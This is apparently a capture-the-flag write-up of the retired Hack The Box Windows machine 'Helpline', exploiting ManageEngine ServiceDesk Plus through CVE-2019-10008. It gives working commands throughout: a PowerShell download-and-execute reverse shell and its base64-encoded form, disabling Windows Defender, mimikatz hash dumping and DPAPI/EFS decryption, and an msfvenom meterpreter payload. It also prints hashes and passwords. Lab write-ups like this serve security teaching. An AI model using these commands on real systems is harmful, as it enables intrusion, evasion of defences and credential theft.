# Helpline

This is the write-up for the box Helpline that got retired at the 17th August 2019.
My IP address was 10.10.13.230 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.132    helpline.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/helpline.nmap 10.10.10.132
```

```markdown
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
8080/tcp open  http-proxy    -
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Set-Cookie: JSESSIONID=95A3A72E00D0F838E1ACBDF21ECD3923; Path=/; HttpOnly
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 01:00:00 GMT
|     Content-Type: text/html;charset=UTF-8
|     Vary: Accept-Encoding
|     Date: Sun, 25 Aug 2019 12:30:20 GMT
|     Connection: close
|     Server: -
```

## Checking HTTP (Port 8080)

On this page we see some Help Desk Software from **ManageEngine ServiceDesk Plus** in the version 9.3.
So lets look for exploits:

```markdown
searchsploit servicedesk 9.3
```

There are some exploits for this software. The privilege escalation exploit _exploits/jsp/webapps/46659.py_ looks good but first we need a username.
If we google for default users for this software, we will get results or another way is to get valid usernames with fuzzing:

```markdown
wfuzz -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -u 'http://10.10.10.132:8080/domainServlet/AJaxDomainServlet?action=searchLocalAuthDomain&timestamp=Sun%20Aug%2025%202019%2015:42:43%20GMT+0200%20(CEST)&search=FUZZ'
```

The usernames _administrator_ and _guest_ with the password _guest_ works.

### CVE-2019-10008

The exploit script uses the vulnerability CVE-2019-10008 and this is what we need to understand first.
It is explained on the founders page: [GitHub page for CVE-2019-10008](https://github.com/FlameOfIgnis/CVE-2019-10008).

Optional:
> To understand every step of this script fully, you can send every request through Burpsuite. Put the following line in the **.curlrc** file and every request gets through Burpsuite:

```markdown
proxy = http://127.0.0.1:8080
```

In the script change the hostname to the IP address of the box and execute it.
It will give us two cookies that we need to replace with out current ones. Put the values given from the script for _JSESSIONSSO_ and JSESSIONID_ and refresh the page.
After that we will be logged in as administrator.

### Getting a reverse shell

Now we are logged in as administrator and want a reverse shell on the box. There is a way to execute code on this webpage.

In the **Admin** page there is a field named **Custom Triggers**. Create a custom trigger like this:
```markdown
Execute the Action: When a Request is created - Any Time
Match criteria: Sender is not whatever
Action Type: Execute Script: cmd /c powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.13.230/shell.ps1')
```

_Shell.ps1_ is just the standard reverse shell from Nishang called _Invoke-PowerShellTcp.ps1_.
It is important that there is only one trigger or else it won't work well.

Optional:
> We can minimize the types of characters we are sending, to not get blocked by an input filter:

```markdown
Base64 decode command:
echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.13.230/shell.ps1')" | iconv -t UTF-16LE  | base64 -w 0

Put this command into the web application:
cmd /c powershell -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMwAuADIAMwAwAC8AcwBoAGUAbABsAC4AcABzADEAJwApAAoA
```

After listening the port 9001 (which I choose in shell.ps1) we get a reverse shell!

## Privilege Escalation

Now as we have a shell on the box lets try to increase our privileges. We are logged in as **NT Authority/SYSTEM** but can't read any flags. With the following command we can see why:

```markdown
cipher /c C:\Users\Administrator\Desktop\root.txt
```

This command shows us that only the user _Administrator_ can read it. This box uses **Encrypted File System** which is an built-in encryption in Windows.

Lets check for files in the home folders:

```markdown
gci -recurse | select fullname
```

Interesting files:
- C:\Users\tolu\Desktop\user.txt
  - Only _tolu_ can decrypt it
- C:\Users\leo\Desktop\admin-pass.xml
  - Only _leo_ can decrypt it
  
So this means that we actually have to decrypt some stuff. In that case we drop Mimikatz on the box:

```markdown
IWR -uri hxxp://10.10.13.230/mimikatz.exe -outfile mimikatz.exe
```

Execution of this won't work because of Windows Defender but we can disable that quickly:

```markdown
Set-MpPreference -DisableRealTimeMonitoring $true
```

Now dump the NTLM passwords:

```markdown
.\mimikatz "token::elevate" "lsadump:sam" "exit"
```

Here are the hashes we get and want to crack or look for:
- Administrator:d5312b245d641b3fae0d07493a022622
- alice:998a9de69e883618e987080249d20253
- zachary:eef285f4c800bcd1ae1e84c371eeb282
- niels:35a9de42e66dcdd5d512a796d03aef50
- leo:60b05a66232e2eb067b973c889b615dd
- tolu:03e2ec7aa7e82e479be07ecd34f1603b

The only hash that could be found on hashes.org was from the user _zachary_. His password is:
> 0987654321

Looking for his groups:

```markdown
net user zachary
```

The user is member of the group **Event Log Readers**. There is a nice script on GitHub to process events on Windows:
[Get-WinEventData](https://github.com/RamblingCookieMonster/PowerShell/blob/master/Get-WinEventData.ps1)

```markdown
IEX(New-Object Net.WebClient).downloadString('http://10.10.13.230/Get-WinEventData.ps1')
$x = Get-WinEvent -FilterHashTable @{Logname='security';id=4688} | Get-WinEventData
Get-WinEvent -FilterHashTable @{Logname='security';id=4688} -MaxEvents 1 | Get-WineventData | fl *
Get-WinEvent -FilterHashTable @{Logname='security';id=4688} | Get-WineventData | select e_CommandLine | ft -autosize -wrap
```

In the output of the last command we can find this information:
> /USER:tolu !zaq1234567890pl!99

Now we have the password for _tolu_ and can decrypt the EFS for user.txt.

### Getting user.txt

We need the thumbprint of the file:
```markdown
cipher /c C:\Users\tolu\Desktop\user.txt
```

It is:
> 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29

If we compare that to the users certificate we see that it is the same string. Location of certificate:
> C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29

There is a tutorial on [how to decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files) and I will go through these steps.

Getting the certificate:
```markdown
.\mimikatz "crypto::system /file:C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29 /export" "exit"
```

We now have the certificates **public key** as a .der file. Get this on our client with a SMB server:

```markdown
impacket-smbserver -smb2support -user test -password test test $(pwd)

Copy the file to our machine:
net use Y: \\10.10.13.230\test /user:test test
copy 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der Y:
```

Now we need to decrypt the private key. Location of private key (hidden file):
> C:\Users\tolu\appdata\roaming\microsoft\protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017

Decrypting the masterkey:
```markdown
.\mimikatz "dpapi::masterkey /in:C:\Users\tolu\appdata\roaming\microsoft\protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017 /password:!zaq1234567890pl!99" "exit"
```

The SHA1 masterkey gets displayed:
> 8ece5985210c26ecf3dd9c53a38fc58478100ccb

Decrypting the private key:
```markdown
.\mimikatz "dpapi::capi /in:C:\Users\tolu\appdata\roaming\microsoft\crypto\rsa\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85 /masterkey:8ece5985210c26ecf3dd9c53a38fc58478100ccb" "exit"
```

This gives us the file **raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk** that we need on our machine.

#### Building the PFX

We have the .der and .pvk file on our machine we can build the certificate with OpenSSL:

```markdown
openssl x509 -inform DER -outform PEM -in 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der -out public.pem
openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk -out private.pem
openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Upload that PFX file on the Windows box and install it:
```markdown
certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
```

user.txt is now readable!

### Getting root.txt

As we need the password of _Administrator_ we first need to become _leo_ as he can read the **admin-pass.xml** file. After some enumeration you will see that the user _leo_ is actually online on the box so we can take over his session.

Lets create a payload:
```markdown
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.13.230 LPORT=9001 -f exe -o msf.exe
```

This payload needs to get uploaded on the box and we will start a listener with Metasploit:
```markdown
msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 9001
set LHOST tun0
run
```

After starting the listener we execute the payload on the box and wait for a connection. The connection will give us a **meterpreter** session.

In this sessions we need to **migrate** the process to explorer.exe and then we can start a **shell**.
There we can read the file **admin-pass.xml** and it displays:
> 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa

This is the output of a _secure string_ in PowerShell. So we need to **load powershell** on our session or just start powershell manually. With the following commands we can convert the string as the password:

```markdown
$pw = gc admin-pass.xml | convertto-securestring
$cred = new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl *
```

We get the password of Administrator:
> mb@letmein@SERVER#acc

With this we can execute commands as Administrator:
```markdown
Invoke-Command -Computername helpline -Credential $cred -Scriptblock { whoami }
```

The command _whoami_ works and that means we can read root.txt. The reason we use **CredSSP** in the next command is because of the double hop problem when remoting with Powershell:
```markdown
Invoke-Command -Computername helpline -Credential $cred -Authentication CredSSP -Scriptblock { type C:\users\administrator\desktop\root.txt }
```

We get root.txt!
